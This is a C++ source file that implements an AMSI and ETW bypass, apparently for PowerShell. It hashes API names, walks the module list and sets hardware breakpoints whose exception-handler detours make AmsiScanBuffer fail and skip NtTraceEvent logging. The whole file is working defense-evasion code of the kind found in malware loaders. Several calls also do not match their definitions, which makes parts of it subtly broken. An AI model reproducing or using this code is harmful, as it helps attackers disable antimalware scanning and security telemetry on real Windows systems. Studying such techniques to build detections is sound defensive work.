#include <General.hpp>

EXTERN_C
auto DECLFN Entry( PVOID Param ) -> VOID {
    INSTANCE Instance = { 0 };

    Instance.Win32.NtContinue = ( decltype( Instance.Win32.NtContinue ) )LoadApi( LoadModule( HashStr("ntdll.dll") ), HashStr("NtContinue") );
    Instance.Win32.NtGetContextThread = ( decltype( Instance.Win32.NtGetContextThread ) )LoadApi( LoadModule( HashStr("ntdll.dll") ), HashStr("NtGetContextThread") );
    Instance.Win32.LoadLibraryA = ( decltype( Instance.Win32.LoadLibraryA ) )LoadApi( LoadModule( HashStr("kernel32.dll") ), HashStr("LoadLibraryA") );

    Instance.Win32.RtlAddVectoredExceptionHandler = ( decltype( Instance.Win32.RtlAddVectoredExceptionHandler ) )LoadApi( LoadModule( HashStr("ntdll.dll") ), HashStr("RtlAddVectoredExceptionHandler") );

    Instance.Hwbp.NtTraceEvent = ( decltype( Instance.Hwbp.NtTraceEvent ) )LoadApi( LoadModule( HashStr("ntdll.dll") ), HashStr("NtTraceEvent") );
    Instance.Hwbp.AmsiScanBuffer = ( decltype( Instance.Hwbp.AmsiScanBuffer ) )LoadApi( (UPTR)Instance.Win32.LoadLibraryA("amsi.dll"), HashStr("AmsiScanBuffer") );

    Hwbp::Act( &Intance );
}

auto DECLFN Hwbp::SetDr7(
    _In_ INSTANCE* Instance,
    _In_ UPTR ActVal,
    _In_ UPTR NewVal,
    _In_ INT  StartPos,
    _In_ INT  BitsCount
) -> UPTR {
    if (StartPos < 0 || BitsCount <= 0 || StartPos + BitsCount > 64) {
        return ActVal;
    }
    
    UPTR Mask = (1ULL << BitsCount) - 1ULL;
    return (ActVal & ~(Mask << StartPos)) | ((NewVal & Mask) << StartPos);
}

auto DECLFN Hwbp::Init( _In_ INSTANCE* Instance ) -> BOOL {
    if ( Instance->Hwbp.Init ) return TRUE;

    PVOID ExceptionHandler = (PVOID)&Hwbp::HandleException;

    Instance->Hwbp.Handler = Instance->Win32.RtlAddVectoredExceptionHandler(
        TRUE, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandler
    );

    Instance->Hwbp.Init = TRUE;

    return TRUE;
}

auto DECLFN Hwbp::Install(
    _In_ INSTANCE* Instance,
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ PVOID Callback
) -> BOOL {
    if (Drx < 0 || Drx > 3) return FALSE;

    Instance->Hwbp.Callbacks[Drx] = (UPTR)Callback;
    Instance->Hwbp.Addresses[Drx] = Address;


    return Hwbp::SetBreak(Address, Drx, TRUE);
}

auto DECLFN Hwbp::SetBreak(
    _In_ INSTANCE* Instance,
    UPTR  Address,
    INT8  Drx,
    BOOL  Init
) -> BOOL {
    if (Drx < 0 || Drx > 3) return FALSE;

    CONTEXT  Ctx    = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE   Handle = NtCurrentThread();
    NTSTATUS Status = STATUS_SUCCESS;

    Status = Instance->Win32.NtGetContextThread(Handle, &Ctx);


    if (Init) {
        (&Ctx.Dr0)[Drx] = Address;
        Ctx.Dr7 = Hwbp::SetDr7(Ctx.Dr7, 3, (Drx * 2), 2); // active breakpoint
    } else {
        (&Ctx.Dr0)[Drx] = 0;
        Ctx.Dr7 = Hwbp::SetDr7(Ctx.Dr7, 0, (Drx * 2), 2); // desactive breakpoint
    }
    
    Status = Instance->Win32.NtContinue( &Ctx, FALSE );

    return NT_SUCCESS(Status);
}

auto DECLFN Hwbp::GetArg(
    _In_ INSTANCE* Instance,
    _In_ PCONTEXT Ctx,
    _In_ ULONG    Idx
) -> UPTR {
#ifdef _WIN64
    switch (Idx) {
        case 1: return Ctx->Rcx;
        case 2: return Ctx->Rdx;
        case 3: return Ctx->R8;
        case 4: return Ctx->R9;
    }
    return *(UPTR*)(Ctx->Rsp + (Idx * sizeof(PVOID)));
#else
    return *(ULONG*)(Ctx->Esp + (Idx * sizeof(PVOID)));
#endif
}

auto DECLFN Hwbp::SetArg(
    _In_ INSTANCE* Instance,
    _In_ PCONTEXT Ctx,
    _In_ UPTR     Val,
    _In_ ULONG    Idx
) -> VOID {
#ifdef _WIN64
    switch (Idx) {
        case 1: Ctx->Rcx = Val; return;
        case 2: Ctx->Rdx = Val; return;
        case 3: Ctx->R8 = Val; return;
        case 4: Ctx->R9 = Val; return;
    }
    *(UPTR*)(Ctx->Rsp + (Idx * sizeof(PVOID))) = Val;
#else
    *(ULONG*)(Ctx->Esp + (Idx * sizeof(PVOID))) = Val;
#endif
}

auto DECLFN Hwbp::HandleException(
    EXCEPTION_POINTERS* e
) -> LONG {
    if ( e->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP ) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    INT8 Drx = -1;
    for ( INT8 i = 0; i < 4; i++ ) {
        if ( e->ExceptionRecord->ExceptionAddress == (PVOID)Instance->Hwbp.Addresses[i] ) { 
            Drx = i;
            break;
        }
    }

    if (Drx == -1 || !Instance->Hwbp.Callbacks[Drx]) {
        return EXCEPTION_CONTINUE_SEARCH;
    }


    Hwbp::SetBreak( Instance->Hwbp.Addresses[Drx], Drx, FALSE);


    VOID ( * CallBackRun )( PCONTEXT )= reinterpret_cast<decltype(CallBackRun)>(Instance->Hwbp.Callbacks[Drx]);
    CallBackRun(e->ContextRecord);


    Hwbp::SetBreak( Instance->Hwbp.Addresses[Drx], Drx, TRUE);


    return EXCEPTION_CONTINUE_EXECUTION;
}

auto DECLFN Hwbp::Act( VOID ) -> BOOL {
    G_INSTANCE

    if (!Hwbp::Init()) return FALSE;

    BOOL Success = TRUE;

// #if (PWSH_BYPASS == BYPASS_ALL || PWSH_BYPASS == BYPASS_ETW)
    Success = Hwbp::Install( (UPTR)Instance->Hwbp.NtTraceEvent, Dr::x1, (PVOID)Hwbp::EtwDetour );
// #endif

// #if (PWSH_BYPASS == BYPASS_ALL || PWSH_BYPASS == BYPASS_AMSI)
    Success = Hwbp::Install( (UPTR)Instance->Hwbp.AmsiScanBuffer, Dr::x2, (PVOID)Hwbp::AmsiDetour );
// #endif

    return Success;
}

// #if (PWSH_BYPASS == BYPASS_ALL || PWSH_BYPASS == BYPASS_ETW)
auto DECLFN Hwbp::EtwDetour( PCONTEXT Ctx ) -> VOID {
    Ctx->Rip  = *(UPTR*)Ctx->Rsp;
    Ctx->Rsp += sizeof(PVOID);
    Ctx->Rax  = STATUS_SUCCESS;
}
// #endif

// #if (PWSH_BYPASS == BYPASS_ALL || PWSH_BYPASS == BYPASS_AMSI)
auto DECLFN Hwbp::AmsiDetour( PCONTEXT Ctx ) -> VOID {
    G_INSTANCE

    Ctx->Rdx    = (UPTR)LoadApi(LoadModule(HashStr("ntdll.dll")), HashStr("NtAllocateVirtualMemory"));
    Ctx->EFlags = (Ctx->EFlags | (1 << 16)); 
}
// #endif

extern "C" void* DECLFN memset(void* dest, int val, size_t count) {
    unsigned char* ptr = (unsigned char*)dest;
    while (count--) *ptr++ = (unsigned char)val;
    return dest;
}

auto DECLFN LoadModule(
    _In_ const ULONG LibHash
) -> UPTR {
    RangeHeadList( NtCurrentPeb()->Ldr->InLoadOrderModuleList, PLDR_DATA_TABLE_ENTRY, {
        if ( !LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }

        if ( HashStr<WCHAR>( Entry->BaseDllName.Buffer ) == LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }
     } )
 
     return 0;
}
 
auto DECLFN LoadApi(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR {
    auto FuncPtr    = UPTR { 0 };
    auto NtHdr      = PIMAGE_NT_HEADERS { nullptr };
    auto DosHdr     = PIMAGE_DOS_HEADER { nullptr };
    auto ExpDir     = PIMAGE_EXPORT_DIRECTORY { nullptr };
    auto ExpNames   = PDWORD { nullptr };
    auto ExpAddress = PDWORD { nullptr };
    auto ExpOrds    = PWORD { nullptr };
    auto SymbName   = PSTR { nullptr };

    DosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>( ModBase );
    if ( DosHdr->e_magic != IMAGE_DOS_SIGNATURE ) {
        return 0;
    }

    NtHdr = reinterpret_cast<IMAGE_NT_HEADERS*>( ModBase + DosHdr->e_lfanew );
    if ( NtHdr->Signature != IMAGE_NT_SIGNATURE ) {
        return 0;
    }

    ExpDir     = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( ModBase + NtHdr->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpNames   = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfNames );
    ExpAddress = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfFunctions );
    ExpOrds    = reinterpret_cast<PWORD> ( ModBase + ExpDir->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDir->NumberOfNames; i++ ) {
        SymbName = reinterpret_cast<PSTR>( ModBase + ExpNames[ i ] );

        if ( HashStr( SymbName ) != SymbHash ) {
            continue;
        }

        FuncPtr = ModBase + ExpAddress[ ExpOrds[ i ] ];

        break;
    }

    return FuncPtr;
}